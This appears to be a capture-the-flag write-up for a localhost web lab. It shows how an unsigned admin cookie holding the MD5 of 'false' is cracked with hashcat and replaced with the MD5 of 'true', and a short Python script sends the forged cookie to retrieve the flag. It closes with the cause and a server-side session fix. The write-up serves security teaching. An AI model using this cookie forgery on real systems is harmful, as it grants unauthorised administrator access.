# How

While browsing the website, I noticed that I had a cookie named `I_am_admin` with the value `68934a3e9455fa72420237eb05902327`.

Based on the length and format, this looks like a MD5 hash.

Cracking it with `hashcat` returns this :

```
68934a3e9455fa72420237eb05902327:false
```

So, we can try to can compute the MD5 hash of `true` and set the cookie to that value.

```bash
$ echo -n 'true' | md5sum
b326b5062b2f0e69046810717534cb09 -
```

```python
import requests
import re

FLAG_REGEX = re.compile(r'(?<=Good job! Flag : )\w+')

cookies = {
    'I_am_admin': 'b326b5062b2f0e69046810717534cb09',
}

response = requests.get('http://localhost:4242/index.php', cookies=cookies)
print("Flag:", FLAG_REGEX.search(response.text)[0])
```

# Why

The website uses a cookie to store whether the user is an admin or not (which is a bad idea in itself).

But the cookie isn't encrypted or signed in any way, so we can just change its value to whatever we want.

# Fix

The best solution would be to store the user's privileges in a database and use a session cookie to identify them.